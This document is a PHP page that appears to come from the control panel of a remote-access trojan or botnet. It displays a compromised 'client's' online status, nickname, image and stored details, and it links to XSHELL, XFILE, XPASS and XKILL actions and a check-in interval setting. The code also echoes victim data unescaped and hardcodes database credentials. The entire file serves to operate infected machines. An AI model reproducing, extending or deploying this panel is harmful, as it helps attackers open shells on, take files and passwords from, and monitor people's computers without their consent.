<?php
    $pdo = new PDO('mysql:host=localhost;dbname=clients', 'hunt3r', 'hunt3r');

    if (isset($_GET['xid'])) {
        $xid = $_GET['xid'];

        // Request -> Advanced Client Information
        $stmt = $pdo->prepare('SELECT * FROM yclients WHERE xid = :xid');
        $stmt->bindParam(':xid', $xid);
    	$stmt->execute();
    	$clientDetails = $stmt->fetch(PDO::FETCH_ASSOC);

    	if ($clientDetails) {
            echo '<h3>Client Details</h3>';
            echo '<div class="rightdetails-pane">';
	    $stmtClientInfo = $pdo->prepare('SELECT status, nickname FROM xclients WHERE xid = :xid');
    	    $stmtClientInfo->bindParam(':xid', $xid);
    	    $stmtClientInfo->execute();
    	    $clientInfo = $stmtClientInfo->fetch(PDO::FETCH_ASSOC);

    	    if ($clientInfo) {
    	        echo '<div class="client-info">';
                echo '<div class="clientdetails-info">';
    
    	        $status = $clientInfo['status'];
    	        $statusColor = ($status === 'online') ? '#00FF00' : 'red';

    	        echo $xid . ' | ' . $clientInfo['nickname'] . ' | <b><span style="color: ' . $statusColor . ';">' . $status . '</b></span>';
        	echo '</div>'; // End -> clientdetails-info"
    	        echo '</div>'; // End -> client-info
	    }

            echo '<div class="client-details-container">';
            echo '<div class="client-image">';
            echo '<img id="clientImage" src="/pic/' . $xid . '.png" alt="Client Image" width="400" height="200">';
            echo '</div>';
            echo '<br>';
            echo '<div class="client-tables">';
            echo '<table class="left-table">';
            $split = false;

	    foreach ($clientDetails as $key => $value) {
 	        if ($key === 'xid') {
       		    $split = true;
        	    continue;
    	        }

	        if ($key === 'filex') {
       	            break;
	        }

                if ($split) {
                    echo '<tr><td>' . $key . '</td><td>' . $value . '</td></tr>';
                }
            }

            echo '</table>';

            echo '<table class="right-table">';
            $split = false;
            foreach ($clientDetails as $key => $value) {
                if ($key === 'filex') {
                    $split = true;
                    continue;
                }
                if ($split) {
                    echo '<tr><td>' . $key . '</td><td>' . $value . '</td></tr>';
                }
            }
            echo '</table>';
            echo '</div>'; // End -> client-tables

            echo '<br>';
            echo '</div>'; // End -> client-details-container
            echo '</div>'; // End -> rightmain-pane
            echo '<div class="client-actions">';
            echo '<a href="xshell.php?sid=' . $xid . '"><button>XSHELL</button></a>';
            echo '<a href="xfile.php?xid=' . $xid . '"><button>XFILE</button></a>';
            echo '<a href="xpass.php?xid=' . $xid . '"><button>XPASS</button></a>';
            echo '<a href="xkill.php?xid=' . $xid . '"><button>XKILL</button></a>';
            echo '<div class="interval-container">';
            echo '<input type="range" id="intervalSlider" min="1" max="30" step="1">';
            echo '<input type="number" id="intervalValue" min="1" max="30">';
            echo '<button id="submitInterval">Submit</button>';
            echo '</div>';
            echo '</div>';
        } else {
            echo '<h2>Client Details</h2><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>';
            echo '<center><font color="red"><h2>ERROR x090<br><br></h2></font></center>';
            echo '<center>For more Information or Troubleshooting please have a look at our Documentation <a href="https://www.google.com" target="_blank">here</a></center>';
        }
    }
?>

